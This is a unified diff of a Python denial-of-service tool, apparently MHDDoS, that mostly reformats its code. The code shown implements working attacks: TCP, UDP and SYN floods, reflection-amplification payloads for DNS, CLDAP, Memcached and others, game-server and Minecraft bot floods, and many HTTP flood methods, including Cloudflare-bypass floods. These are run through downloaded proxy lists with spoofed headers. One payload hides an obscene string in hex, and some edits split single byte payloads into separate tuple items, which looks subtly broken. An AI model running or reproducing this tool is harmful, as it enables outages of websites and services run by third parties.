@@ -51,13 +51,20 @@ __ip__: Any = None
 
 def getMyIPAddress():
     global __ip__
-    if __ip__:  return __ip__
-    with suppress(Exception): __ip__ = get('https://api.my-ip.io/ip', timeout=.1).text
-    with suppress(Exception): __ip__ = get('https://ipwhois.app/json/', timeout=.1).json()["ip"]
-    with suppress(Exception): __ip__ = get('https://ipinfo.io/json', timeout=.1).json()["ip"]
-    with suppress(Exception):  __ip__ = ProxyTools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text)
-    with suppress(Exception): __ip__ = ProxyTools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text)
-    with suppress(Exception): __ip__ = get('https://ip.42.pl/raw', timeout=.1).text
+    if __ip__:
+        return __ip__
+    with suppress(Exception):
+        __ip__ = get('https://api.my-ip.io/ip', timeout=.1).text
+    with suppress(Exception):
+        __ip__ = get('https://ipwhois.app/json/', timeout=.1).json()["ip"]
+    with suppress(Exception):
+        __ip__ = get('https://ipinfo.io/json', timeout=.1).json()["ip"]
+    with suppress(Exception):
+        __ip__ = ProxyTools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text)
+    with suppress(Exception):
+        __ip__ = ProxyTools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text)
+    with suppress(Exception):
+        __ip__ = get('https://ip.42.pl/raw', timeout=.1).text
     return getMyIPAddress()
 
 
@@ -93,7 +100,7 @@ google_agents = [
 ]
 
 
-class Counter(object):
+class Counter:
     def __init__(self, value=0):
         self._value = RawValue('i', value)
 
@@ -154,7 +161,8 @@ class Tools:
     @staticmethod
     def send(sock: socket, packet: bytes):
         global BYTES_SEND, REQUESTS_SENT
-        if not sock.send(packet): return False
+        if not sock.send(packet):
+            return False
         BYTES_SEND += len(packet)
         REQUESTS_SENT += 1
         return True
@@ -162,14 +170,16 @@ class Tools:
     @staticmethod
     def sendto(sock, packet, target):
         global BYTES_SEND, REQUESTS_SENT
-        if not sock.sendto(packet, target): return False
+        if not sock.sendto(packet, target):
+            return False
         BYTES_SEND += len(packet)
         REQUESTS_SENT += 1
         return True
 
     @staticmethod
     def safe_close(sock=None):
-        if sock: sock.close()
+        if sock:
+            sock.close()
 
 
 class Minecraft:
@@ -190,7 +200,8 @@ class Minecraft:
         return Minecraft.varint(len(payload)) + payload
 
     @staticmethod
-    def short(integer: int) -> bytes: return data_pack('>H', integer)
+    def short(integer: int) -> bytes:
+        return data_pack('>H', integer)
 
     @staticmethod
     def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
@@ -273,6 +284,7 @@ class Layer4(Thread):
         else:
             s = socket(conn_type, sock_type, proto_type)
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        s.settimeout(60)
         s.connect(self._target)
         return s
 
@@ -295,8 +307,9 @@ class Layer4(Thread):
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "CLDAP":
-            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
-                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00', 389)
+            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00',
+                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
+                                 389)
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "MEM":
@@ -318,15 +331,17 @@ class Layer4(Thread):
             self._amp_payloads = cycle(self._generate_amp())
         if name == "DNS":
             self._amp_payload = (
-                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
-                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
+                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00',
+                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
+                53)
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
 
     def TCP(self) -> None:
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, randbytes(1024)): continue
+            while Tools.send(s, randbytes(1024)):
+                continue
         Tools.safe_close(s)
 
     def MINECRAFT(self) -> None:
@@ -335,19 +350,22 @@ class Layer4(Thread):
 
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, handshake): Tools.send(s, ping)
+            while Tools.send(s, handshake):
+                Tools.send(s, ping)
         Tools.safe_close(s)
 
     def CPS(self) -> None:
         global REQUESTS_SENT
         s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s: REQUESTS_SENT += 1
+        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+            REQUESTS_SENT += 1
         Tools.safe_close(s)
 
     def alive_connection(self) -> None:
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while s.recv(1): continue
+            while s.recv(1):
+                continue
         Tools.safe_close(s)
 
     def CONNECTION(self) -> None:
@@ -359,7 +377,8 @@ class Layer4(Thread):
     def UDP(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1024), self._target): continue
+            while Tools.sendto(s, randbytes(1024), self._target):
+                continue
         Tools.safe_close(s)
 
     def SYN(self) -> None:
@@ -367,7 +386,8 @@ class Layer4(Thread):
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, payload, self._target): continue
+            while Tools.sendto(s, payload, self._target):
+                continue
         Tools.safe_close(s)
 
     def AMP(self) -> None:
@@ -376,7 +396,8 @@ class Layer4(Thread):
         with suppress(Exception), socket(AF_INET, SOCK_RAW,
                                          IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, *payload): continue
+            while Tools.sendto(s, *payload):
+                continue
         Tools.safe_close(s)
 
     def MCBOT(self) -> None:
@@ -393,7 +414,8 @@ class Layer4(Thread):
             c = 360
             while Tools.send(s, Minecraft.keepalive(randint(1111111, 9999999))):
                 c -= 1
-                if c: continue
+                if c:
+                    continue
                 c = 360
                 Tools.send(s, Minecraft.chat(Tools.randchr(100)))
         Tools.safe_close(s)
@@ -403,21 +425,24 @@ class Layer4(Thread):
         payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                    b'\x20\x51\x75\x65\x72\x79\x00')
         with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target): continue
+            while Tools.sendto(s, payload, self._target):
+                continue
         Tools.safe_close(s)
 
     def FIVEM(self) -> None:
         global BYTES_SEND, REQUESTS_SENT
         payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
         with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target): continue
+            while Tools.sendto(s, payload, self._target):
+                continue
         Tools.safe_close(s)
 
     def TS3(self) -> None:
         global BYTES_SEND, REQUESTS_SENT
         payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
         with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target): continue
+            while Tools.sendto(s, payload, self._target):
+                continue
         Tools.safe_close(s)
 
     def MCPE(self) -> None:
@@ -427,7 +452,8 @@ class Layer4(Thread):
                    b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                    b'\x73')
         with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target): continue
+            while Tools.sendto(s, payload, self._target):
+                continue
         Tools.safe_close(s)
 
     def _genrate_syn(self) -> bytes:
@@ -491,7 +517,8 @@ class HttpFlood(Thread):
         self._host = host
         self._raw_target = (self._host, (self._target.port or 80))
 
-        if not self._target.host[len(self._target.host) - 1].isdigit(): self._raw_target = (self._host, (self._target.port or 80))
+        if not self._target.host[len(self._target.host) - 1].isdigit():
+            self._raw_target = (self._host, (self._target.port or 80))
 
         if not referers:
             referers: List[str] = [
@@ -535,7 +562,8 @@ class HttpFlood(Thread):
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
-        while self._synevent.is_set(): self.SENT_FLOOD()
+        while self._synevent.is_set():
+            self.SENT_FLOOD()
 
     @property
     def SpoofIP(self) -> str:
@@ -555,10 +583,13 @@ class HttpFlood(Thread):
                            "\r\n"))
 
     def open_connection(self) -> socket:
-        if self._proxies: sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
-        else: sock = socket(AF_INET, SOCK_STREAM)
+        if self._proxies:
+            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
+        else:
+            sock = socket(AF_INET, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        sock.settimeout(60)
         sock.connect(self._raw_target)
 
         if self._target.scheme.lower() == "https":
@@ -592,7 +623,8 @@ class HttpFlood(Thread):
              '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
         s = None
         with  suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc): Tools.send(s, payload)
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
     def STRESS(self) -> None:
@@ -603,7 +635,8 @@ class HttpFlood(Thread):
              '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc): Tools.send(s, payload)
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
     def COOKIES(self) -> None:
@@ -616,7 +649,8 @@ class HttpFlood(Thread):
              ProxyTools.Random.rand_str(32)))
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc): Tools.send(s, payload)
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
     def APACHE(self) -> None:
@@ -625,7 +659,8 @@ class HttpFlood(Thread):
                                             for i in range(1, 1024)))
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc): Tools.send(s, payload)
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
     def XMLRPC(self) -> None:
@@ -642,20 +677,23 @@ class HttpFlood(Thread):
              ProxyTools.Random.rand_str(64)))[:-2]
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc): Tools.send(s, payload)
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
     def PPS(self) -> None:
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc): Tools.send(s, self._defaultpayload)
+            for _ in range(self._rpc):
+                Tools.send(s, self._defaultpayload)
         Tools.safe_close(s)
 
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc): Tools.send(s, payload)
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
     def BOT(self) -> None:
@@ -681,27 +719,31 @@ class HttpFlood(Thread):
         with suppress(Exception), self.open_connection() as s:
             Tools.send(s, p1)
             Tools.send(s, p2)
-            for _ in range(self._rpc): Tools.send(s, payload)
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
     def EVEN(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
-            while Tools.send(s, payload) and s.recv(1): continue
+            while Tools.send(s, payload) and s.recv(1):
+                continue
         Tools.safe_close(s)
 
     def OVH(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(min(self._rpc, 5)): Tools.send(s, payload)
+            for _ in range(min(self._rpc, 5)):
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
     def CFB(self):
         global REQUESTS_SENT, BYTES_SEND
         pro = None
-        if self._proxies: pro = randchoice(self._proxies)
+        if self._proxies:
+            pro = randchoice(self._proxies)
         s = None
         with suppress(Exception), create_scraper() as s:
             for _ in range(self._rpc):
@@ -723,7 +765,10 @@ class HttpFlood(Thread):
         with suppress(Exception), self.open_connection() as s:
             Tools.send(s, payload)
             sleep(5.01)
-            for _ in range(self._rpc): Tools.send(s, payload)
+            ts = time()
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
+                if time() > ts + 120: break
         Tools.safe_close(s)
 
     def AVB(self):
@@ -741,7 +786,8 @@ class HttpFlood(Thread):
         with suppress(Exception), Session() as s:
             with s.post(self._target.human_repr()) as ss:
                 ss.raise_for_status()
-                for key, value in ss.cookies.items(): s.cookies.set_cookie(cookies.create_cookie(key, value))
+                for key, value in ss.cookies.items():
+                    s.cookies.set_cookie(cookies.create_cookie(key, value))
             for _ in range(min(self._rpc, 5)):
                 sleep(min(self._rpc, 5) / 100)
                 if self._proxies:
@@ -764,7 +810,8 @@ class HttpFlood(Thread):
                                           "\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc): Tools.send(s, payload)
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
     def DOWNLOADER(self):
@@ -777,14 +824,16 @@ class HttpFlood(Thread):
                 while 1:
                     sleep(.01)
                     data = s.recv(1)
-                    if not data: break
+                    if not data:
+                        break
             Tools.send(s, b'0')
         Tools.safe_close(s)
 
     def BYPASS(self):
         global REQUESTS_SENT, BYTES_SEND
         pro = None
-        if self._proxies: pro = randchoice(self._proxies)
+        if self._proxies:
+            pro = randchoice(self._proxies)
         s = None
         with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
@@ -819,7 +868,8 @@ class HttpFlood(Thread):
                              'Upgrade-Insecure-Requests: 1\r\n\r\n')
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc): Tools.send(s, payload)
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
     def NULL(self) -> None:
@@ -838,7 +888,6 @@ class HttpFlood(Thread):
         pro = randchoice(self._proxies)
 
         run([
-            f'{Path.home() / "go/bin/bombardier"}',
             f'{bombardier_path}',
             f'--connections={self._rpc}',
             '--http2',
@@ -854,7 +903,8 @@ class HttpFlood(Thread):
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc): Tools.send(s, payload)
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
             while Tools.send(s, payload) and s.recv(1):
                 for i in range(self._rpc):
                     keep = str.encode("X-a: %d\r\n" % randint(1, 5000))
@@ -926,7 +976,8 @@ class ProxyManager:
                 for provider in providrs
             }
             for future in as_completed(future_to_download):
-                for pro in future.result(): proxes.add(pro)
+                for pro in future.result():
+                    proxes.add(pro)
         return proxes
 
     @staticmethod
@@ -943,8 +994,7 @@ class ProxyManager:
                         data.splitlines(), proxy_type):
                     proxes.add(proxy)
             except Exception as e:
-                logger.error('Download Proxy Error: %s' %
-                             (e.__str__() or e.__repr__()))
+                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
         return proxes
 
 
@@ -954,17 +1004,19 @@ class ToolsConsole:
     @staticmethod
     def checkRawSocket():
         with suppress(OSError):
-            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP): return True
+            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
+                return True
         return False
 
     @staticmethod
     def runConsole():
-        cons = "%s@BetterStresser:~#" % gethostname()
+        cons = f"{gethostname()}@MHTools:~#"
 
         while 1:
             cmd = input(cons + " ").strip()
             if not cmd: continue
-            if " " in cmd: cmd, args = cmd.split(" ", 1)
+            if " " in cmd:
+                cmd, args = cmd.split(" ", 1)
 
             cmd = cmd.upper()
             if cmd == "HELP":
@@ -985,7 +1037,7 @@ class ToolsConsole:
                 continue
 
             if not {cmd} & ToolsConsole.METHODS:
-                print("%s command not found" % cmd)
+                print(f"{cmd} command not found")
                 continue
 
             if cmd == "DSTAT":
@@ -1099,8 +1151,8 @@ class ToolsConsole:
                     print('please wait ...', end="\r")
 
                     info = ToolsConsole.ts_srv(domain)
-                    logger.info("TCP: %s\n" % (info['_tsdns._tcp.']))
-                    logger.info("UDP: %s\n" % (info['_ts3._udp.']))
+                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
+                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")
 
             if cmd == "PING":
                 while True:
@@ -1187,22 +1239,27 @@ class ToolsConsole:
         for rec in records:
             try:
                 srv_records = resolver.resolve(rec + domain, 'SRV')
-                for srv in srv_records: Info[rec] = str(srv.target).rstrip('.') + ':' + str(srv.port)
-            except: Info[rec] = 'Not found'
-
+                for srv in srv_records:
+                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(
+                        srv.port)
+            except:
+                Info[rec] = 'Not found'
 
         return Info
 
     # noinspection PyUnreachableCode
     @staticmethod
     def info(domain):
-        with suppress(Exception), get("https://ipwhois.app/json/%s/" % domain) as s: return s.json()
+        with suppress(Exception), get("https://ipwhois.app/json/%s/" % domain) as s:
+            return s.json()
         return {"success": False}
 
 
 def handleProxyList(con, proxy_li, proxy_ty, url=None):
-    if proxy_ty not in {4, 5, 1, 0, 6}: exit("Socks Type Not Found [4, 5, 1, 0, 6]")
-    if proxy_ty == 6: proxy_ty = randchoice([4, 5, 1])
+    if proxy_ty not in {4, 5, 1, 0, 6}:
+        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
+    if proxy_ty == 6:
+        proxy_ty = randchoice([4, 5, 1])
     if not proxy_li.exists():
         logger.warning("The file doesn't exist, creating files and downloading proxies.")
         proxy_li.parent.mkdir(parents=True, exist_ok=True)
@@ -1227,7 +1284,8 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
             wr.write(stringBuilder)
 
     proxies = ProxyUtiles.readFromFile(proxy_li)
-    if proxies: logger.info(f"Proxy Count: {len(proxies):,}")
+    if proxies:
+        logger.info(f"Proxy Count: {len(proxies):,}")
     else:
         logger.info(
             "Empty Proxy File, running flood witout proxy")
@@ -1243,9 +1301,12 @@ if __name__ == '__main__':
             with suppress(IndexError):
                 one = argv[1].upper()
 
-                if one == "HELP": raise IndexError()
-                if one == "TOOLS": ToolsConsole.runConsole()
-                if one == "STOP": ToolsConsole.stop()
+                if one == "HELP":
+                    raise IndexError()
+                if one == "TOOLS":
+                    ToolsConsole.runConsole()
+                if one == "STOP":
+                    ToolsConsole.stop()
 
                 method = one
                 host = None
@@ -1254,7 +1315,8 @@ if __name__ == '__main__':
                 event.clear()
                 target = None
                 urlraw = argv[2].strip()
-                if not urlraw.startswith("http"): urlraw = "http://" + urlraw
+                if not urlraw.startswith("http"):
+                    urlraw = "http://" + urlraw
 
                 if method not in Methods.ALL_METHODS:
                     exit("Method Not Found %s" %
@@ -1263,8 +1325,10 @@ if __name__ == '__main__':
                 if method in Methods.LAYER7_METHODS:
                     url = URL(urlraw)
                     host = url.host
-                    try: host = gethostbyname(url.host)
-                    except Exception as e: exit('Cannot resolve hostname ', url.host, e)
+                    try:
+                        host = gethostbyname(url.host)
+                    except Exception as e:
+                        exit('Cannot resolve hostname ', url.host, e)
                     threads = int(argv[4])
                     rpc = int(argv[6])
                     timer = int(argv[7])
@@ -1273,7 +1337,7 @@ if __name__ == '__main__':
                                     argv[5].strip())
                     useragent_li = Path(__dir__ / "files/useragent.txt")
                     referers_li = Path(__dir__ / "files/referers.txt")
-                    bombardier_path = Path(__dir__ / "go/bin/bombardier")
+                    bombardier_path = Path.home() / "go/bin/bombardier"
                     proxies: Any = set()
 
                     if method == "BOMB":
@@ -1285,10 +1349,13 @@ if __name__ == '__main__':
                             "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
                         )
 
-                    if len(argv) == 9: logger.setLevel("DEBUG")
+                    if len(argv) == 9:
+                        logger.setLevel("DEBUG")
 
-                    if not useragent_li.exists(): exit("The Useragent file doesn't exist ")
-                    if not referers_li.exists(): exit("The Referer file doesn't exist ")
+                    if not useragent_li.exists():
+                        exit("The Useragent file doesn't exist ")
+                    if not referers_li.exists():
+                        exit("The Referer file doesn't exist ")
 
                     uagents = set(a.strip()
                                   for a in useragent_li.open("r+").readlines())
@@ -1298,8 +1365,11 @@ if __name__ == '__main__':
                     if not uagents: exit("Empty Useragent File ")
                     if not referers: exit("Empty Referer File ")
 
-                    if threads > 1000: logger.warning("Thread is higher than 1000")
-                    if rpc > 100: logger.warning("RPC (Request Pre Connection) is higher than 100")
+                    if threads > 1000:
+                        logger.warning("Thread is higher than 1000")
+                    if rpc > 100:
+                        logger.warning(
+                            "RPC (Request Pre Connection) is higher than 100")
 
                     proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                     for _ in range(threads):
@@ -1308,16 +1378,21 @@ if __name__ == '__main__':
 
                 if method in Methods.LAYER4_METHODS:
                     target = URL(urlraw)
+
                     port = target.port
                     target = target.host
 
-                    try: target = gethostbyname(target)
-                    except Exception as e: exit('Cannot resolve hostname ', url.host, e)
+                    try:
+                        target = gethostbyname(target)
+                    except Exception as e:
+                        exit('Cannot resolve hostname ', url.host, e)
 
-                    if port > 65535 or port < 1: exit("Invalid Port [Min: 1 / Max: 65535] ")
+                    if port > 65535 or port < 1:
+                        exit("Invalid Port [Min: 1 / Max: 65535] ")
 
                     if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN"} and \
-                            not ToolsConsole.checkRawSocket(): exit("Cannot Create Raw Socket")
+                            not ToolsConsole.checkRawSocket():
+                        exit("Cannot Create Raw Socket")
 
                     threads = int(argv[3])
                     timer = int(argv[4])
@@ -1334,20 +1409,24 @@ if __name__ == '__main__':
                             if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                                 if not refl_li.exists():
                                     exit("The reflector file doesn't exist")
-                                if len(argv) == 7: logger.setLevel("DEBUG")
+                                if len(argv) == 7:
+                                    logger.setLevel("DEBUG")
                                 ref = set(a.strip()
                                           for a in ProxyTools.Patterns.IP.findall(
                                     refl_li.open("r+").read()))
                                 if not ref: exit("Empty Reflector File ")
 
                             elif argfive.isdigit() and len(argv) >= 7:
-                                if len(argv) == 8: logger.setLevel("DEBUG")
+                                if len(argv) == 8:
+                                    logger.setLevel("DEBUG")
                                 proxy_ty = int(argfive)
                                 proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
                                 proxies = handleProxyList(con, proxy_li, proxy_ty)
-                                if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}: exit("this method cannot use for layer4 proxy")
+                                if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
+                                    exit("this method cannot use for layer4 proxy")
 
-                            else: logger.setLevel("DEBUG")
+                            else:
+                                logger.setLevel("DEBUG")
 
                     for _ in range(threads):
                         Layer4((target, port), ref, method, event,
